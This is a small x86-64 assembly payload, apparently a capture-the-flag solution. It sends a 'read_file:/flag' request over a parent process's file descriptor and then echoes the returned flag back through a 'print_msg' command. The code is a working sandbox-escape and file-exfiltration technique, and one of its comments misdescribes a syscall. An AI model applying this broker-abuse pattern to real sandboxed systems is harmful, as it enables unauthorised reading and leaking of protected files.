.globl _start
.intel_syntax noprefix

_start:
    mov rax, 1                      # SYS_write
    mov rdi, 4                      # Parent file descriptor
    lea rsi, [rip + flag]           # Command to read flag
    mov rdx, 60                     # Number of bytes
    syscall                         # write(4, "read_file:/flag", 60)

    xor rax, rax                    # SYS_read
    mov rdi, 4                      # Parent file descriptor
    lea rsi, [rip + flag_content]   # Where to store the data
    mov rdx, 60                     # Number of bytes
    syscall                         # read(4, "print_msg:", 60)

    mov rax, 1                      # SYS_write
    mov rdi, 4                      # Parent file descriptor
    lea rsi, [rip + print_msg]      # print_msg command
    mov rdx, 128                    # Number of bytes
    syscall                         # write(4, "print_msg:{flag}", 128)

print_msg:
    .ascii "print_msg:"

flag_content:
    .rept 60
    .byte 0
    .endr

flag:
    .asciz "read_file:/flag"
